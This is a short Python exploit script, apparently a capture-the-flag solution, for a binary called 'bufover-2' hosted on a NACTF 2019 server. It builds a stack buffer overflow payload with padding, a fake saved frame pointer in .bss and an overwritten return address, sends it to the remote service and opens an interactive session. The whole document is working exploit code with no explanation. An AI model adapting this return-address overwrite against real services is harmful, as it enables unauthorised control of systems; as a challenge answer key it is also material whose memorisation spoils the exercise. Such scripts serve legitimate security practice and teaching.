from ptrlib import *

elf = ELF("./bufover-2")
#sock = Process("./bufover-2")
sock = Socket("shell.2019.nactf.com", 31184)
payload = b'A' * 0x18
payload += p32(elf.section(".bss") + 0x300) # ebp
payload += p32(0x804921F)
sock.sendlineafter(">", payload)

sock.interactive()
